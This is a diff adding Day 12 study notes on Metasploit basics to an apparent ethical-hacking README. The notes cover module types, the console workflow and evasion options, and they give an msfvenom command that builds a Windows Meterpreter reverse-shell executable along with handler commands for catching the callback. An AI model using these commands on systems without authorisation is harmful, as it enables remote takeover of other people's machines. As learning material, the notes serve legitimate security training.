@@ -788,3 +788,63 @@ msfvenom -l payloads | grep "windows/meterpreter/reverse_tcp"
 - Learned differences between **staged** and **stageless** payloads.
 - Understood how to identify payload types in Metasploit.
 ---
+
+
+# Day 12 — Metasploit Framework Basics
+
+This README provides a summary of the topics covered in Day 12 of the Ethical Hacking learning plan.
+
+## 1. msfconsole
+The **msfconsole** is the primary interactive command-line interface for the Metasploit Framework. It is used to search, configure, and execute modules.
+
+## 2. Module Types
+Metasploit includes various module types:
+- **Exploit** — Code to exploit vulnerabilities.
+- **Payload** — Code delivered after exploitation (e.g., Meterpreter).
+- **Auxiliary** — Scanners, fuzzers, and brute-forcers.
+- **Post** — Post-exploitation modules for persistence or data gathering.
+- **Encoder** — Transforms payloads to avoid bad characters.
+- **NOP** — Padding instructions for exploits.
+- **Evasion** — Techniques to bypass detection.
+
+## 3. Typical Workflow
+1. `search <term>` — Find relevant modules.
+2. `use <module-path>` — Load the module.
+3. `show options` — View required settings.
+4. `set <option> <value>` — Configure options.
+5. `exploit` or `run` — Execute the module.
+
+## 4. show evasion
+Displays evasion options for supported modules to help avoid detection.
+
+## 5. msfvenom Example
+Example command:
+```
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=<your-IP> LPORT=4444 -f exe -o windows_payloads.exe
+```
+- `-p` — Payload type.
+- `LHOST` — Attacker IP.
+- `LPORT` — Port for callback.
+- `-f` — Output format.
+- `-o` — Output file.
+
+## 6. Starting a Listener
+Use the `exploit/multi/handler` module:
+```
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+set LHOST <your-IP>
+set LPORT 4444
+run
+```
+Always start the listener before executing the payload on the target.
+
+## 7. Notes
+- Staged payloads send a stager first, then the main payload.
+- Stageless payloads contain everything in one stage.
+- Encoders avoid bad characters but aren't guaranteed AV bypass.
+- NOPs provide safe padding.
+- Evasion modules may bypass some defenses.
+
+---
+**Disclaimer:** Use Metasploit only on systems you own or have explicit permission to test.
